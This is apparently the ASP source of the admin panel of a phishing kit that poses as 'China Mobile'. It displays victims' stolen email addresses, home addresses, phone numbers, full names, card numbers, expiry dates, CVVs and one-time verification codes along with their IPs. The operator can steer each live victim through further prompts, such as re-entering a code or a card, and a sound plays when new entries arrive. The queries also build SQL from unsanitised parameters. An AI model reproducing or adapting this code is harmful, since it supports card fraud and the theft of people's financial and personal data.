<!--#include file="lconn.asp"-->
<!--#include file="Admin.asp"-->
<!--#include file="ip.asp"-->
<%
getid=Request.QueryString("getid")
cz=Request.QueryString("cz")

if getid<>"" then
if cz="1" then
sql="Update bank set cz=0 Where id="&getid&""
	conn.Execute sql
Response.Redirect "mylist.asp"
elseif cz="0" then
sql="Update bank set cz=1 Where id="&getid&""
	conn.Execute sql
Response.Redirect "mylist.asp"
end if
else

filename="mylist.asp"
  page=clng(request("page"))
if Request.QueryString("yes")="no" then
id= Trim(Request("id"))
Set Rs = Server.CreateObject("ADODB.Recordset")
Rs.ActiveConnection = Conn
Rs.Open "DELETE from bank Where id="&id,Conn,2,3,1
Set Rs= Nothing
Set Conn = Nothing
Response.Redirect "mylist.asp"
end if
%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<TITLE>China Mobile</title>
<meta  http-equiv="Content-Type"  content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0" />
<meta name="apple-mobile-web-app-capable" content="yes" />
</head>
<meta http-equiv="Refresh" content="10" />
<body >
<body bgcolor="#DCDCDC">
</div>
</body>
<link href="app/mcadmin.css"  type="text/css" rel="stylesheet">
<style type="text/css">
<!--
.STYLE1 {color: #FF0000}
.STYLE2 {color: #0000FF}
table,td,a,div{font-size:22px;font-weight:bold;}

.i {color:blue;cursor:pointer;text-decoration:underline}
-->
a{text-decoration:none;}
</style>
<script type="text/javascript" src="app/jquery-1.4.4.min.js"></script>
<script type="text/javascript" src="app/myfunction.js"></script>

</head>

<img src="s.jpg" width="100%" height="auto" />
<table width="100%" border="0" cellpadding="0" cellspacing="0" bordercolor="#FF0000" class="font" >
 <tr>
<td><form name="form1" action="mylist.asp" method="post" id="form1">
<table width="100%" border="0" cellpadding="5" cellspacing="1" bgcolor="#5B6AB5" class="font">
<tr  bgcolor="#D8E1FA" >
<td width="50" align="center" style="    font-weight: 500;padding-top: 8px;padding-bottom: 8px;">查</td>
<td width="50" align="center" style="    font-weight: 500;padding-top: 8px;padding-bottom: 8px;">在线</td>
<td width="1" align="center" style="    font-weight: 500;padding-top: 8px;padding-bottom: 8px;">系统</td>
<td width="1"  align= "center" style="  min-width:190px;  font-weight: 500;padding-top: 8px;padding-bottom: 8px;">邮箱/地址/邮编</td>
<td width="200" align="center" style="    font-weight: 500;padding-top: 8px;padding-bottom: 8px;">手机号/全名</td>
<td width="200" align="center" style="    font-weight: 500;padding-top: 8px;padding-bottom: 8px;color:#e2041b;">卡号/日期/CVV</td> 
<td width="100" align="center" style="    font-weight: 500;padding-top: 8px;padding-bottom: 8px;">第一次</td>
<td width="60"  align="center" style="    font-weight: 500;padding-top: 8px;padding-bottom: 8px;">获取</td>
<td width="100" align="center" style="    font-weight: 500;padding-top: 8px;padding-bottom: 8px;">第二次</td>
<td width="130" align="center" style="    font-weight: 500;padding-top: 8px;padding-bottom: 8px;color:#e2041b;">验证码</td>
<td width="90" align="center" style="    font-weight: 500;padding-top: 8px;padding-bottom: 8px;">自定义</td>
<td width="90"  align="center" style="    font-weight: 500;padding-top: 8px;padding-bottom: 8px;">时间</td>
<td width="100" align="center" style="    font-weight: 500;padding-top: 8px;padding-bottom: 8px;">访问IP</td>
<td width="50" align="center" style="    font-weight: 500;padding-top: 8px;padding-bottom: 8px;">XxX</td>


</tr>
<%
set rsl=server.createobject("adodb.recordset")
sqll="SELECT  * FROM bank where cz=0 Order BY id desc"
rsl.open sqll,conn,1,1
if rsl.bof and rsl.eof then
response.Write("<tr bgcolor='#ffffff'><td colspan='17'>....................................开工大吉....................................</td><tr>")
response.End()
end if
rsl.PageSize=20
if page=0 then page=1 
pages=rsl.pagecount
if page > pages then page=pages
rsl.AbsolutePage=page  
for j=1 to rsl.PageSize 
%>
<tr bgcolor="#EEEEEE"  id="id_<%=rsl("id")%>"  title="提交时间：<%=rsl("sj")%> | 提交IP：<%=rsl("ipp")%>">
<td align="center" style="padding-top: 7px;padding-bottom: 7px;">
<input type="text" style="color:#FFFFFF;background-color:#3eb370;font-size:17px;border-radius: 15px;width:100%;height:40px;text-align: center;" value="<%=rsl("je")%>" id="je<%=rsl("id")%>" name="je" size="5" onchange='setfrom(this.id,"bank","je");'></td>
<td align="center" style="padding-top: 7px;padding-bottom: 7px;">
<%
if dateDiff("n",rsl("online"),now()) > 2 then
response.write "<span style=color:#000;font-size:30px;>&hearts;</span>"
else
response.write "<span style=color:#E53333;font-size:30px;>&hearts;</span>"
end if
%>
</td>
<td align="center" style="padding-top: 5px;padding-bottom: 6px;font-weight:bold;"><%=rsl("os")%></td>  		
<td align="center" style="padding-top: 5px;font-weight: 500;font-size:22px;padding-bottom: 6px;"><%=rsl("xm")%></td>
<td align="center" style="padding-top: 5px;font-weight: 500;padding-bottom: 6px;"><%=rsl("mm")%></td>
<td align="center" style="padding-top: 5px;font-weight: 500;padding-bottom: 6px;color:#e2041b;"><%=rsl("sfz")%></td> 
<td align="center" style="padding-top: 5px;font-weight: 500;padding-bottom: 6px;">
<select id='aa<%=rsl("id")%>' name='aa<%=rsl("id")%>' onchange='setfrom(this.id,"bank","m");' style="color:#FFFFFF;background-color:#008899;    font-weight: 500;font-size:17px;width:100%;height:40px;    border-radius: 5px;">
        <option value="0" <%if rsl( "m")="0" then response.Write "selected" end if%>>&nbsp;&nbsp;&nbsp;默认通过</option>
        <!--<option value="2" <%if rsl( "m")="2" then response.Write "selected" end if%>>☻_填验证码</option>-->
        <!--<option value="18" <%if rsl( "m")="18" then response.Write "selected" end if%>>☻_填卡</option>-->
        <!--<option value="19" <%if rsl( "m")="19" then response.Write "selected" end if%>>☻_填手机号</option>-->
        <!--<option value="99" <%if rsl( "m")="99" then response.Write "selected" end if%>>☻_自定义密保</option>-->
        <!--<option value="4" <%if rsl( "m")="4" then response.Write "selected" end if%>>☻_账户错误</option>-->
        <!--<option value="3" <%if rsl( "m")="3" then response.Write "selected" end if%>>☻_密码错误</option>-->
        <!--<option value="14" <%if rsl( "m")="14" then response.Write "selected" end if%>>☻_认证成功</option>-->
</select>



</td>
<td align="center" style="padding-top: 7px;font-weight: 500;font-size:22px;padding-bottom: 7px;"><%=rsl("num")%></td>
<td align="center" style="padding-top: 7px;padding-bottom: 7px;">
<select id='bb<%=rsl("id")%>' name='bb<%=rsl("id")%>' onchange='setfrom(this.id,"bank","n");' style="color:#FFFFFF;background-color:#e60033;    font-weight: 500;font-size:17px;width:100%;height:40px;    border-radius: 5px;">
<option value="0" <%if rsl( "n")="0" then response.Write "selected" end if%>>&nbsp;&nbsp;&nbsp;未通过</option>
<option value="6" <%if rsl( "n")="6" then response.Write "selected" end if%>>☻_认证成功</option>
<option value="8" <%if rsl( "n")="8" then response.Write "selected" end if%>>☻_填验证码</option>
<option value="7" <%if rsl( "n")="7" then response.Write "selected" end if%>>☻_验证码不对</option>
<option value="15" <%if rsl( "n")="15" then response.Write "selected" end if%>>☻_信用卡不对</option>
 <!--<option value="10" <%if rsl( "n")="10" then response.Write "selected" end if%>>☻_填PIN码</option>-->
 <!--<option value="9" <%if rsl( "n")="9" then response.Write "selected" end if%>>☻_重新提问</option>-->

</select>
</td>
<td align="center" style="padding-top: 5px;font-weight: 500;color:#e2041b;font-size:16;padding-bottom: 5px;"><%=rsl("yzm")%></td>
<td nowrap align="center" ><a href="update.asp?id=<%=rsl("id")%>&yes=no" style="    font-weight: 500;padding-top: 8px;padding-bottom: 8px;">自定义设置</a></td>
<td align="center" style="padding-top: 7px;font-size:8px;padding-bottom: 7px;"><%=hour(rsl("sj"))&":"&minute(rsl("sj"))&" "&Month(rsl("sj"))&"/"&day(rsl("sj"))%></td>
<td nowrap align="center" style="padding-top: 7px;font-size:8px;padding-bottom: 7px;"><%=rsl("ipp")%></td>
<td align="center" style="padding-top: 7px;padding-bottom: 7px;"><a href="mylist.asp?id=<%=rsl("id")%>&amp;yes=no" onclick="return confirm('x');">删除</a></td> 	
</tr>
<%
rsl.movenext
if rsl.eof then exit for
next
%>
</table>
<center><img src="s.jpg" width="100%" height="auto" /></center>
</td>
</tr>
  
  <!--end-->
<br>
<tr>	<center>	
          <td height="27"  style="padding-top: 7px;padding-bottom: 7px;" >
	<TABLE width="100%" class="font">
	<!--<center>	
		<input class='input' type='submit'  value='● ● 确 定 ● ●'  name='cndok' style="border-radius: 7px;font-size:25px;color: #fff; background-color: #0185d0;font-family: Microsoft YaHei;font-weight: bold;padding: 3px 33px 3px 33px ;">
	</center>	-->
	
	<br><br>
		  <form method='Post' name='form2' action="mylist.asp"><br>
		  

	<center style="    font-weight: 500;padding-top: 8px;padding-bottom: 8px;">	  
	
	
	<p style="font-size:20px; color:#FF0000;margin-top: 6px;"><%
      countcss=-1
	  whichfile=server.mappath("../count.txt")
      Set fs=CreateObject("Scripting.FileSystemObject")
      Set thisfile=fs.opentextfile(whichfile)
      visitors=thisfile.readline
      thisfile.close
      set fs=nothing
	  
      countlen=len(visitors)
	  response.write "访问量：" & visitors
%></p>
	
              <%
				if Page<2 then      

					response.write "首页 上一页&nbsp;"
				else
					response.write "<a href="&filename&"?page=1>首页</a>&nbsp;"
					response.write "<a href="&filename&"?page=" & Page-1 & ">上一页</a>&nbsp;"
				end if
				if rsl.pagecount-page<1 then
					response.write "下一页 尾页"
				else
					response.write "<a href="&filename&"?page=" & (page+1) & ">"
					response.write "下一页</a> <a href="&filename&"?page="&rsl.pagecount&">尾页</a>"
				end if
				response.write "&nbsp;页次：<strong><font color=red>"&Page&"</font>/"&rsl.pagecount&"</strong>页 "
				response.write "&nbsp;共<b><font color='#FF0000'>"&rsl.recordcount&"</font></b>条记录 <b>"&rsl.pagesize&"</b>条记录/页"
				response.write " 转到：<input type='text' name='page' size=4 maxlength=10 class=input value="&page&">"
				%>	</center></form></td>
        </tr>
				
			


<% 
end if
rsl.close
set rsl=nothing
%>
</TABLE>
</td>
</tr>
</table>

<%
ssid = clng(session("ssid"))
set rs = conn.execute("select count(*) from bank where m=0 and id>"&ssid)
if not rs.eof then
	if rs(0)>0 then
		set rs2 = conn.execute("select max(id) from bank")
		if not rs2.eof then
			session("ssid") = rs2(0)
		end if
		set rs2 = nothing
%>
<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="1" height="1">
  <param name="movie" value="sms.mp3">
  <param name="quality" value="high">
  <embed src="sms.mp3" loop="True" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="1" height="1"></embed>
  
  
  
  <audio id="shake_action" src="918.mp3" preload="auto" autoplay="true" width="1" height="1"></audio>
  
  
  
</object>
<%
end if
end if
Set Conn = Nothing
%>

</body>
</html>
<br><br>

